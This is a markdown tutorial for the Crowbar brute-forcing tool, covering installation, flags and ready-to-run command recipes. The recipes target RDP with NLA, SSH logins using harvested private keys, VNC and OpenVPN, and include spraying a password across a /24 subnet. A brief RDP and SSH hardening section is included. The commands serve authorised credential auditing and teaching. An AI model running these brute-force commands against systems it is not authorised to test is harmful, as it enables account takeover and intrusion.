# Crowbar — Targeted Network Protocol & Key Brute-Forcing Guide

A complete, production-grade guide to **Crowbar** (`crowbar`), a specialized Python-based penetration testing tool designed to brute-force network protocols that rely on non-standard authentication schemes—such as **RDP with Network Level Authentication (NLA)**, **SSH private keys**, **VNC**, and **OpenVPN** configurations.

---

## 📑 Table of Contents

- [1. Overview & Crowbar Niche in Credential Auditing](#1-overview-crowbar-niche-in-credential-auditing)
  - [The RDP NLA Problem: Why Hydra Often Fails](#the-rdp-nla-problem-why-hydra-often-fails)
  - [SSH Private Key Testing vs Password Brute-Force](#ssh-private-key-testing-vs-password-brute-force)
- [2. Installation & Dependency Configuration](#2-installation-dependency-configuration)
  - [Installing Crowbar from Source via Git](#installing-crowbar-from-source-via-git)
  - [Installing System Dependencies (FreeRDP & OpenSSL)](#installing-system-dependencies-freerdp-openssl)
  - [Python Virtual Environment Setup](#python-virtual-environment-setup)
- [3. CLI Flags & Operational Parameters](#3-cli-flags-operational-parameters)
  - [Protocol Selection (-b rdp, sshkey, vnc, openvpn)](#protocol-selection--b-rdp-sshkey-vnc-openvpn)
  - [Host, User & Credential Specification Options](#host-user-credential-specification-options)
  - [Threading, Concurrency & Timeout Control](#threading-concurrency-timeout-control)
- [4. Targeted Attack Recipes](#4-targeted-attack-recipes)
  - [RDP Brute-Force with Network Level Authentication (NLA)](#rdp-brute-force-with-network-level-authentication-nla)
  - [SSH Authentication via Private Key Lists](#ssh-authentication-via-private-key-lists)
  - [VNC Remote Desktop Password Auditing](#vnc-remote-desktop-password-auditing)
  - [OpenVPN Configuration Authentication](#openvpn-configuration-authentication)
- [5. Advanced Auditing Patterns & Automation](#5-advanced-auditing-patterns-automation)
  - [Auditing CIDR Subnet Ranges (e.g. 192.168.1.0/24)](#auditing-cidr-subnet-ranges-eg-1921681024)
  - [Output File Parsing & Log Extraction](#output-file-parsing-log-extraction)
- [6. Defensive Hardening & Detection](#6-defensive-hardening-detection)
  - [Securing RDP: Restricting Access & Enforcing MFA](#securing-rdp-restricting-access-enforcing-mfa)
  - [SSH Host Hardening: Key Rotation & Passphrase Enactment](#ssh-host-hardening-key-rotation-passphrase-enactment)
- [7. Quick Reference Cheat Sheet & FAQ](#7-quick-reference-cheat-sheet-faq)
  - [CLI Commands Summary Table](#cli-commands-summary-table)
  - [Troubleshooting & Common Pitfalls](#troubleshooting-common-pitfalls)

---

## 1. Overview & Crowbar Niche in Credential Auditing

### The RDP NLA Problem: Why Hydra Often Fails

Traditional network brute-forcers like **THC-Hydra** and **Medusa** were architected around standard text-stream protocols (FTP, Telnet, HTTP). When interacting with modern Microsoft Remote Desktop (RDP port 3389), Windows enforces **Network Level Authentication (NLA)** via CredSSP (Credential Security Support Provider protocol) before establishing the graphical RDP session.

Standard brute-force tools frequently:
- Drop connections during TLS/CredSSP negotiation.
- Misinterpret NLA negotiation failures as valid logins (false positives) or fatal socket errors.
- Trigger Windows blue screens or service crashes on legacy terminal servers due to improper handshake teardowns.

**Crowbar** was built specifically to solve this problem. Written in Python, it wraps genuine client libraries (such as `freerdp` / `xfreerdp`) to conduct genuine, protocol-compliant handshakes against NLA-hardened endpoints with zero false positives.

```
┌─────────────────────────────────────────────────────────────┐
│                    Crowbar Architecture                     │
│                                                             │
│       ┌─────────────── Target Protocol ─────────────┐       │
│       │                                             │       │
│       ▼                                             ▼       │
│ ┌──────────────┐                             ┌────────────┐ │
│ │   RDP NLA    │                             │  SSH Keys  │ │
│ │ (FreeRDP/    │                             │ (Paramiko/ │ │
│ │  CredSSP)    │                             │  SSH lib)  │ │
│ └──────┬───────┘                             └──────┬─────┘ │
│        │                                            │       │
│        ▼                                            ▼       │
│ ┌─────────────────────────────────────────────────────────┐ │
│ │           Multi-Threaded Worker Pool (Python)           │ │
│ └─────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────┘
```

### SSH Private Key Testing vs Password Brute-Force

Most brute-forcers test a single username against 1,000 passwords. In modern cloud and DevSecOps environments, password authentication is disabled, and access is granted strictly via **SSH RSA/Ed25519 Private Keys**.

Crowbar can test a directory containing hundreds of collected private keys against a target server to determine which key grants access.

---

## 2. Installation & Dependency Configuration

### Installing Crowbar from Source via Git

```bash
# Clone Crowbar repository
git clone https://github.com/qazbnm456/crowbar.git
cd crowbar
```

### Installing System Dependencies (FreeRDP & OpenSSL)

For RDP brute-forcing, Crowbar requires `xfreerdp` on the system:

```bash
# macOS via Homebrew
brew install freerdp openssl

# Ubuntu / Debian / Kali Linux
sudo apt-get update
sudo apt-get install -y freerdp2-x11 libssl-dev python3-pip
```

### Python Virtual Environment Setup

```bash
# Create and activate virtual environment
python3 -m venv venv
source venv/bin/activate

# Install Python requirements
pip install -r requirements.txt
```

Verify execution:

```bash
python3 crowbar.py -h
```

---

## 3. CLI Flags & Operational Parameters

### Protocol Selection (-b rdp, sshkey, vnc, openvpn)

The `-b` flag declares the target protocol:
- `-b rdp`: Remote Desktop Protocol with NLA.
- `-b sshkey`: SSH authentication using private key files.
- `-b vnc`: VNC server password authentication.
- `-b openvpn`: OpenVPN configuration and user credential verification.

### Host, User & Credential Specification Options

| Flag | Parameter | Description |
| :--- | :--- | :--- |
| `-b` | `PROTOCOL` | Target service (`rdp`, `sshkey`, `vnc`, `openvpn`). |
| `-s` | `IP/CIDR` | Target server IP or CIDR subnet (e.g. `192.168.1.100/32` or `10.0.0.0/24`). |
| `-S` | `FILE` | Path to text file containing target IP addresses. |
| `-u` | `USER` | Username to test. |
| `-U` | `FILE` | Path to file containing usernames. |
| `-c` | `PASS` | Password to test. |
| `-C` | `FILE` | Path to password dictionary file. |
| `-k` | `DIR/KEY` | Path to SSH private key file or directory containing keys. |
| `-p` | `PORT` | Custom port (defaults: RDP 3389, SSH 22, VNC 5900). |
| `-d` | `DOMAIN` | Windows Active Directory domain name. |

### Threading, Concurrency & Timeout Control

| Flag | Parameter | Description |
| :--- | :--- | :--- |
| `-n` | `NUM` | Number of concurrent worker threads (default: `1`). |
| `-l` | `FILE` | Log output file for discovered credentials. |
| `-o` | `FILE` | Path to save valid hits. |

---

## 4. Targeted Attack Recipes

### RDP Brute-Force with Network Level Authentication (NLA)

Test credentials against a Windows RDP server on port 3389:

```bash
# Single user with wordlist against single IP
python3 crowbar.py \
  -b rdp \
  -s 192.168.1.50/32 \
  -u Administrator \
  -C /usr/share/wordlists/rockyou.txt \
  -n 4

# Target Windows Domain with username and password lists
python3 crowbar.py \
  -b rdp \
  -s 192.168.1.50/32 \
  -d CORP \
  -U domain_users.txt \
  -C passwords.txt \
  -n 4
```

### SSH Authentication via Private Key Lists

Test an entire directory of leaked or harvested SSH private keys against a target host:

```bash
# Test a folder of harvested SSH keys against user 'ubuntu'
python3 crowbar.py \
  -b sshkey \
  -s 10.0.0.25/32 \
  -u ubuntu \
  -k /path/to/harvested_keys/ \
  -n 2
```

When a matching key is found, Crowbar prints:
```text
[+] RHOST: 10.0.0.25 - SSH-KEY: /path/to/harvested_keys/prod_id_rsa - USER: ubuntu
```

### VNC Remote Desktop Password Auditing

Audit VNC desktop servers (VNC does not require usernames, only passwords):

```bash
python3 crowbar.py \
  -b vnc \
  -s 192.168.1.75/32 \
  -C passwords.txt \
  -n 4
```

### OpenVPN Configuration Authentication

Test user credentials against an OpenVPN server gateway:

```bash
python3 crowbar.py \
  -b openvpn \
  -s 192.168.1.1/32 \
  -p 1194 \
  -u vpnuser \
  -C passwords.txt \
  -k client_config.ovpn
```

---

## 5. Advanced Auditing Patterns & Automation

### Auditing CIDR Subnet Ranges (e.g. 192.168.1.0/24)

Crowbar natively accepts CIDR subnet notation, automatically iterating across all live IP addresses in the subnet:

```bash
# Audit an entire /24 subnet for default Administrator credentials
python3 crowbar.py \
  -b rdp \
  -s 192.168.1.0/24 \
  -u Administrator \
  -c 'Welcome123!' \
  -n 8 \
  -o rdp_discovered.txt
```

### Output File Parsing & Log Extraction

Save and grep discovered credentials:

```bash
# Review discovered credentials log
cat rdp_discovered.txt | grep "VALID"
```

---

## 6. Defensive Hardening & Detection

### Securing RDP: Restricting Access & Enforcing MFA

1. **Do Not Expose Port 3389 Directly to the Internet**: Require users to connect via an encrypted WireGuard/OpenVPN tunnel or HTTPS Remote Desktop Gateway before reaching RDP.
2. **Account Lockout on RDP**: Configure Windows Group Policy `Account lockout threshold` to prevent brute-force attacks against domain accounts.
3. **Multi-Factor Authentication (MFA)**: Implement solutions like Duo Security or Azure AD MFA on Windows Server RDSH hosts.

### SSH Host Hardening: Key Rotation & Passphrase Enactment

1. **Passphrase Protection**: Always encrypt private keys with a passphrase (`ssh-keygen -p -f ~/.ssh/id_rsa`).
2. **Rotate Lost Keys**: Immediately remove compromised public keys from `~/.ssh/authorized_keys`.

---

## 7. Quick Reference Cheat Sheet & FAQ

### CLI Commands Summary Table

| Action | Command Syntax |
| :--- | :--- |
| **RDP Audit (Single User)** | `python3 crowbar.py -b rdp -s IP/32 -u user -C wordlist.txt` |
| **RDP Audit (Domain)** | `python3 crowbar.py -b rdp -s IP/32 -d DOMAIN -u user -C wordlist.txt` |
| **RDP Subnet Scan** | `python3 crowbar.py -b rdp -s 10.0.0.0/24 -u user -c 'Pass123'` |
| **SSH Private Key Audit** | `python3 crowbar.py -b sshkey -s IP/32 -u user -k /keys/` |
| **VNC Password Audit** | `python3 crowbar.py -b vnc -s IP/32 -C wordlist.txt` |
| **OpenVPN Audit** | `python3 crowbar.py -b openvpn -s IP/32 -u user -C wordlist.txt -k file.ovpn` |
| **Thread Concurrency** | Append `-n NUM` (e.g. `-n 4`) |
| **Save Valid Output** | Append `-o output.txt` |

### Troubleshooting & Common Pitfalls

> [!NOTE]
> **FreeRDP Missing**: If Crowbar crashes with `xfreerdp not found`, ensure `freerdp` is installed and symlinked on your system `PATH`.

> [!TIP]
> **Subnet Suffix Required**: Always specify `/32` for single IP addresses (e.g. `192.168.1.50/32`), as Crowbar expects CIDR notation.

> [!IMPORTANT]
> **RDP Session Limits**: Windows 10/11 only supports 1 concurrent active RDP session. High thread counts can lock the local desktop screen. Keep `-n` set to `2` or `4`.
